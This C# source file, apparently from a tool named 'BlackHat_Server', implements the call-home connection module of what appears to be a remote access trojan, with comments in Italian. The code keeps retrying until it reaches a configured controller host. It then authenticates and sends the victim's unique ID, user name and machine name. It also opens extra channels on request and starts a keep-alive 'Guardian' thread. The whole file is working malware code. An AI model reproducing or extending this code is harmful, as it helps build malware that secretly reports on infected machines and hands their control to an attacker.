using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace BlackHat_Server
{
    internal class Connection
    {
        public void StartServer()
        {
            // PRIMA CONNESSIONE
            tryConnect();
            // RIMANGO SOPRA FINO A CHE NN SONO CONNESSO

            // ORA SONO CONNESSO CREO THREAD GUARDIAN E THREAD KEEP ALIVE
            var guard = new Guardian();
            guard.StartGuardian();
        }


        /// <summary>
        ///     Prima connessione Con invio di Info di avvio!
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        private void tryConnect()
        {
            var host = ST_Client.Instance.Host;
            var port = ST_Client.Instance.Port;

            IPAddress testIP;
            var isIP = IPAddress.TryParse(host, out testIP);

            while (!ST_Client.Instance.isConnected)
                try
                {
                    if (!isIP)
                        ST_Client.Instance.Connessione.Connect(host,
                            port); // provo a connettermi altrimenti entro nel catch e aspetto X sec
                    else
                        ST_Client.Instance.Connessione.Connect(testIP,
                            port); // provo a connettermi altrimenti entro nel catch e aspetto X sec

                    ST_Client.Instance.isConnected = FirstConnection();

                    if (!ST_Client.Instance.isConnected)
                        Thread.Sleep(30000);
                }
                catch
                {
                    Thread.Sleep(5000);
                }
        }
        //***********************************************************


        /// <summary>
        ///     Trovo una connessione controllo diritti e invio info di avvio
        /// </summary>
        private bool FirstConnection()
        {
            var ns = ST_Client.Instance.Connessione.GetStream();
            var psw = ST_Client.Instance.Password;

            // INVIO LA MIA PASSWORD E IL MIO ID!
            var mm = new MsgManager(ns);

            var pswSend = "PSW|" + psw;

            mm.SendEncryMessage(pswSend, 20000);

            // ASPETTO RISPOSTA
            var firstAnswer = mm.WaitForEncryMessage(20000);


            //RISPOSTA POSITIVA
            if (firstAnswer == "OK")
            {
                var gi = new GetInfo();

                //RISPONDO CON LE INFO DI AVVIO
                var mn = gi.MachineName();
                var un = gi.UserName();


                var ms = string.Format("{0}|{1}|{2}|{3}|{4}", ST_Client.Instance.UnivoqueID, un, mn,
                    ST_Client.Instance.ServerName, ST_Client.Instance.ServerVersion);

                var sent = mm.SendEncryMessage(ms, 20000);
                // SE INVIO CORRETTAMENTE QUESTO MESSAGGIO SONO CONNESSO 
                if (sent) return true;

                ST_Client.Instance.Connessione.Close();
                ST_Client.Instance.Connessione = new TcpClient();
                return false;
            }

            ST_Client.Instance.Connessione.Close();
            ST_Client.Instance.Connessione = new TcpClient();
            return false;
            //---------------------------------------------
        }
        //---------------------------------------------------------------


        /// <summary>
        ///     Mando Richiesta di Nuova Slot. Format NEW_STREAM|SERVICE|ID
        /// </summary>
        /// <returns></returns>
        public TcpClient NewSlotRequest(string service, string id)
        {
            var timeout = false;
            var connected = false;
            var c = 0;
            var newSlot = new TcpClient();

            while (!timeout)
            {
                try
                {
                    newSlot.Connect(ST_Client.Instance.Host, ST_Client.Instance.Port);
                    // SE RIESCO A CONNETTERMI ESCO DAL LOOP
                    connected = true;
                    break;
                }
                catch
                {
                    Thread.Sleep(1500);
                }

                c += 1500;

                if (c >= 10000)
                    timeout = true;
            }

            // INVIO RICHIESTA
            if (connected)
            {
                var mm = new MsgManager(newSlot.GetStream());

                var req = string.Format("NEW_STREAM|{0}|{1}", service, id);

                var sent = mm.SendEncryMessage(req, 5000);

                if (sent)
                {
                    var response = mm.WaitForEncryMessage(10000);

                    // RISPOSTA CORRETTA
                    if (response == "OK")
                        return newSlot;
                    return null;

                    //--------------------------------------------
                }
                // NON SONO RIUSCITO AD INVIARE LA RICHIESTA
                //newSlot.GetStream().Close();
                //newSlot.Close();

                return null;
            }

            // NON SONO RIUSCITO A CONNETTERMI
            newSlot.GetStream().Close();
            newSlot.Close();

            return null;
        }
        //---------------------------------------------------------------


        ///// <summary>
        ///// Prima connessione Con invio di Info di avvio!
        ///// </summary>
        ///// <param name="ip"></param>
        ///// <param name="port"></param>
        //public NetworkStream newConnection(string ip, int port, string key)
        //{

        //    IPAddress toIp = IPAddress.Parse(ip);

        //    try
        //    {
        //        TcpClient tcpc = new TcpClient();
        //        tcpc.Connect(toIp, port);

        //        MsgManager com = new MsgManager(tcpc.GetStream());

        //        // RICHIEDO UNA NUOVA CONNESSIONE
        //        com.SendEncryMessage("NEW STREAM REQUIRED|KEEP ALIVE|"+key,15000);


        //        return tcpc.GetStream();
        //    }
        //    catch 
        //    {
        //        return null;
        //    }


        //}
        ////***********************************************************
    }
}